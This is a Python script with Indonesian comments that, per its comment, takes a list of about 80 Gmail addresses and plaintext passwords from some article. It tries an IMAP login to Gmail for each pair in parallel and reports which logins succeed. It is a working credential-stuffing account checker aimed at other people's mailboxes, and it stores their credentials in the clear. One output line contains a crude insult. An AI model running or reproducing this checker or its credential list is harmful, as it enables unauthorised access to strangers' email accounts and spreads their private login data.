import imaplib
import socket
import re
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

# Daftar dari artikel itu
accounts = [
    ("pukakokdashi@gmail.com", "pukakodashi18"),
    ("ropanguripku@gmail.com", "imperfectperson13"),
    ("ramanensin77@gmail.com", "pokapochita1922"),
    ("ulticnkemu01@gmail.com", "laylanoob1200"),
    ("exammythic18@gmail.com", "mythichoror0981"),
    ("weedthrees88@gmail.com", "jacksperow81"),
    ("assassinationcollection@gmail.com", "pikoladonya78"),
    ("classroomofelite@gmail.com", "zetianpoke18"),
    ("jasakreatif@gmail.com", "dongodoci00"),
    ("forcedvage@gamail.com", "roti00blag"),
    ("fannyonlynocounter@gmail.com", "onlyKufracanbeatFannya"),
    ("yarametedesuka@gmail.com", "nullumdelictum12"),
    ("slimebroglooonly@gmail.com", "BlueGlooe13"),
    ("miyashaker@gmail.com", "miyaDarat45"),
    ("djiampothman@gmail.com", "njiarankepang0099"),
    ("rstumommy1@gmail.com", "pokicli1"),
    ("priasejatiumild@gmail.com", "prisegaanti001"),
    ("gusakiraguitars@gmail.com", "freakingshow0123"),
    ("nicollomachiavilain@gmail.com", "fraterniter78"),
    ("averostisem@gmail.com", "hiphopgobedsquad"),
    ("suicidegurl@gmail.com", "egaliterfrat45"),
    ("horriblebadgurl@gmail.com", "zethianqueen023"),
    ("chiptosupport@gmail.com", "NiceTry0047"),
    ("epicbalmond@gmail.com", "kintakun334"),
    ("shootxml@gmail.com", "programmerslife"),
    ("siska1098@gmail.com", "sister1098"),
    ("Glacxor211@gmail.com", "goha4905"),
    ("fanes_imoets21@gmail.com", "fanesa12"),
    ("jiwogfarming@gmail.com", "JiwogorangeCat12"),
    ("saepjalicat12@gmail.com", "graybrotherhood019"),
    ("scarletjonatan01@gmail.com", "pikaros01"),
    ("mamamiamama@gmail.com", "mamamiamami229"),
    ("bielzebubgotcha@gmail.com", "Queenoftheair99"),
    ("aldoesonepunchman19@gmail.com", "auroraTurudek19"),
    ("makimamia@gmail.com", "MakimaChainsawman0109"),
    ("rubbytankfighter@gmail.com", "HildaRubbytank29"),
    ("amaliscarletsolution@gmail.com", "comebackStronger11"),
    ("strongholdenough@gmail.com", "strongholdcross!"),
    ("johnwolflamb@gmail.com", "wolftrigger20203"),
    ("amaterasuyoichi@gamail.com", "ajmcaryoshh02"),
    ("jiaraankipangz@gmail.com", "furioucat010"),
    ("pokiminnerow@gmail.com", "Pokifire9210"),
    ("bungostraycats@gmail.com", "animeloverz12"),
    ("fastfoodnotgood@gmail.com", "FFNG family!"),
    ("nursyifaputri98@gmail.com", "nursyf98"),
    ("killpro.player@gmail.com", "killproml12"),
    ("mobacekplayer2020@gmail.com", "mobaml20"),
    ("gustfraja@gmail.com", "gustraja6782"),
    ("ginanjarputra@gmail.com", "gputra90"),
    ("nickoproplayer@gmail.com", "nikomoba01"),
    ("jcxdamha@gmail.com", "damha123"),
    ("kunchariwa98@gmail.com", "chariw89"),
    ("defidefle@gmail.com", "01 june1994"),
    ("differentsee@gmail.com", "different123"),
    ("iccangwandi6@gmail.com", "compressor11"),
    ("tatamarcha76@gmail.com", "tatamarsyahaha67"),
    ("epicmobaml@gmail.com", "Latest Epic 1"),
    ("mobilelegendsterbaru@gmail.com", "mlnew21"),
    ("jonshon.adam@gmail.com", "adam120194"),
    ("jeyshenuhi@gmail.com", "jeyshen89"),
    ("ismail.comsks@gmail.com", "12345 yah"),
    ("abicok@gmail.com", "abicok"),
    ("ridokur99@gmail.com", "idokur99"),
    ("gamerssejati0011@gmail.com", "nogamenolife"),
    ("yaniyaniyani@gmail.com", "yanihandayani01"),
    ("abbyarsyil179@gmail.com", "abbyfarahcavi"),
    ("betashantika1997@gmail.com", "betachan97"),
    ("agestri@gmail.com", "agestrii23"),
    ("icaicaicaintan@gmail.com", "icaintansari23"),
    ("rahmadtio54@gmail.com", "tiokece12"),
    ("tobiproplayer21@gmail.com", "i love you12"),
    ("lalalarina@gmail.com", "rinala09"),
    ("cacaxgamers@gmail.com", "true gamers"),
    ("nursyifaputri43@gmail.com", "nursyf43"),
    ("siampadupril23@gmail.com", "Chain123"),
    ("durta567@gmail.com", "durta234"),
    ("upin_ipin_8974@gmail.com", "02202p12"),
    ("tata15032015@gmail.com", "elearning123"),
    ("nogamenolife32@gmail.com", "mlproplayer"),
    ("hendrisyah87@gmail.com", "hendrihendri1"),
]

EMAIL_REGEX = re.compile(r"^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}$")

def valid_format(email):
    if " " in email:
        return False, "ada spasi di email"
    if not EMAIL_REGEX.match(email):
        return False, "format email nggak valid"
    return True, "ok"

def cek_satu(item):
    email, password = item
    ok, alasan = valid_format(email)
    if not ok:
        return (email, "FORMAT_SALAH", alasan, 0)
    domain = email.split("@")[1]
    if domain not in ("gmail.com", "googlemail.com"):
        return (email, "DOMAIN_ASING", f"domain {domain} bukan gmail", 0)
    start = time.time()
    try:
        mail = imaplib.IMAP4_SSL("imap.gmail.com", 993, timeout=15)
        mail.login(email, password)
        mail.logout()
        elapsed = round(time.time() - start, 2)
        return (email, "BERHASIL", "login sukses", elapsed)
    except imaplib.IMAP4.error as e:
        elapsed = round(time.time() - start, 2)
        return (email, "GAGAL_AUTH", str(e)[:80], elapsed)
    except socket.gaierror:
        return (email, "DNS_ERROR", "domain nggak ketemu", 0)
    except socket.timeout:
        return (email, "TIMEOUT", "server nggak jawab", 0)
    except Exception as e:
        return (email, "ERROR_LAIN", str(e)[:80], 0)

def main():
    print(f"Total akun: {len(accounts)}")
    print("Mulai cek, sabar kontol...\n")
    hasil = []
    with ThreadPoolExecutor(max_workers=5) as ex:
        futures = {ex.submit(cek_satu, acc): acc for acc in accounts}
        for i, fut in enumerate(as_completed(futures), 1):
            email, status, msg, elapsed = fut.result()
            hasil.append((email, status, msg, elapsed))
            print(f"[{i}/{len(accounts)}] {email} -> {status} ({msg}) {elapsed}s")
    print("\n=== RINGKASAN ===")
    from collections import Counter
    c = Counter(h[1] for h in hasil)
    for k, v in c.most_common():
        print(f"{k}: {v}")
    print("\n=== YANG BERHASIL (kalau ada) ===")
    for email, status, msg, elapsed in hasil:
        if status == "BERHASIL":
            print(f"{email} -> LOGIN SUKSES")

if __name__ == "__main__":
    main()
